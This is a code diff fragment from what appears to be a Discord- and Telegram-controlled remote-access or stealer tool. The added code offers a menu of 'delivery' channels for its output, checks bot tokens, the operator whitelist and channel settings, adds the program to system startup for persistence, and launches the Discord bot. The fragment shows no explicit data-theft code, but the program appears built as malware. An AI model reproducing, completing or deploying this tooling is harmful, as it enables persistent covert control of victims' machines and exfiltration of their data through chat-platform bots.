+{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
+{Colors.RESET}
+""")
+    
+    # Let user choose delivery method
+    delivery_choice = select_delivery_method()
+    
+    # Map choice to config
+    if delivery_choice == "discord":
+        Config.DELIVERY_METHOD = "discord"
+        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord Only{Colors.RESET}")
+    elif delivery_choice == "telegram":
+        Config.DELIVERY_METHOD = "telegram"
+        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram Only{Colors.RESET}")
+    elif delivery_choice == "both":
+        Config.DELIVERY_METHOD = "both"
+        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord + Telegram{Colors.RESET}")
+    elif delivery_choice == "discord_backup":
+        Config.DELIVERY_METHOD = "discord_backup"
+        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord (Telegram Backup){Colors.RESET}")
+    elif delivery_choice == "telegram_backup":
+        Config.DELIVERY_METHOD = "telegram_backup"
+        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram (Discord Backup){Colors.RESET}")
+    
+    # Show config status
+    print(f"""
+{Colors.YELLOW}───────────────────────────────────────────────────────────────
+{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{'✓ Set' if Config.WHITELISTED and Config.WHITELISTED[0] != "{placeholder_whitelist}" else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{'✓ Set' if Config.MAIN_CHANNEL and Config.MAIN_CHANNEL != "{placeholder_main_channel}" else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_CHAT_ID else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Delivery Method: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
+{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
+{Colors.YELLOW}───────────────────────────────────────────────────────────────
+""")
+    
+    # Check for missing config
+    if Config.DELIVERY_METHOD in ["discord", "both", "discord_backup"] and (not Config.TOKEN or Config.TOKEN == "{placeholder_token}"):
+        print(f"{Colors.RED}[!] Discord token not set! Edit Config.TOKEN{Colors.RESET}")
+    if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and not Config.TELEGRAM_BOT_TOKEN:
+        print(f"{Colors.RED}[!] Telegram bot token not set! Edit Config.TELEGRAM_BOT_TOKEN{Colors.RESET}")
+    
+    time.sleep(2)
+    
+    # Add to startup if enabled
     if Config.STARTUP:
         add_to_startup()
-    bot.run(Config.TOKEN)
+    
+    # Start the bot
+    try:
+        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and Config.TELEGRAM_BOT_TOKEN:
+            # Start Telegram bot in background (if implemented)
+            pass
+        bot.run(Config.TOKEN)
+    except Exception as e:
+        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+        input("Press Enter to exit...")
